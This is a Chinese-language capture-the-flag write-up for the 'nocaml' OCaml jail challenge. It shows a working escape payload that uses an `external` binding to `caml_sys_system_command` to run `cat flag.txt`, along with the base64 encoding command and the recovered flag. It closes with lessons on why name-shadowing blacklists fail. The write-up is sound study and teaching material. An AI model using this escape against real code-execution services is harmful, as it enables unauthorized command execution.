# nocaml

## 题目简述

服务接收一行 Base64，解码成 `code.ml`，再执行：

```bash
ocamlc -o out -open Nocaml code.ml
./out
```

`Nocaml` 模块把常见运算符、I/O 函数以及 `Stdlib`、`Sys`、`Unix` 等模块名全部重新绑定为空值或空模块，目的是让提交代码无法调用标准文件 API。限制只覆盖 OCaml 名称解析层，却没有禁止语言的 `external` 声明；攻击者仍可直接绑定 OCaml runtime 中已经链接进 `ocamlrun` 的 C primitive。

## 解题过程

OCaml 允许声明一个函数由指定的 runtime symbol 实现：

```ocaml
external command : string -> int = "caml_sys_system_command"
```

`caml_sys_system_command` 是运行时用于执行系统命令的 primitive。它不需要从被清空的 `Sys` 或 `Unix` 模块取函数值，因此 `-open Nocaml` 的遮蔽不会影响这个绑定。

完整提交源码为：

```ocaml
external command : string -> int = "caml_sys_system_command"

let _ = command "cat flag.txt"
```

服务只读取一行，所以先把源码编码为不换行的 Base64：

```bash
printf '%s' 'external command : string -> int = "caml_sys_system_command"

let _ = command "cat flag.txt"' | base64 -w0
```

`ocamlc` 成功链接后执行输出文件，`cat` 的标准输出直接回到连接中，得到：

```text
uiuctf{nocaml_79976241e31bee31e37c42885}
```

这里不需要恢复任何被遮蔽的标准库标识符；真正的执行边界在“编译器是否允许链接任意已注册 primitive”，而不是当前作用域里有哪些 OCaml 名称。

## 方法总结

- 核心技巧：使用 OCaml `external` 直接绑定 `caml_sys_system_command`，绕过通过 `-open` 模块遮蔽实现的标准库限制。
- 识别信号：服务仍调用完整编译器和 runtime，只在源语言作用域中覆盖危险函数，却允许 FFI、external primitive 或链接指令。
- 复用要点：语言级黑名单不能替代进程隔离。设计编译型 jail 时还要限制 FFI、链接器、编译参数、runtime primitive 和子进程能力，并在 OS 层收紧文件和 syscall 权限。
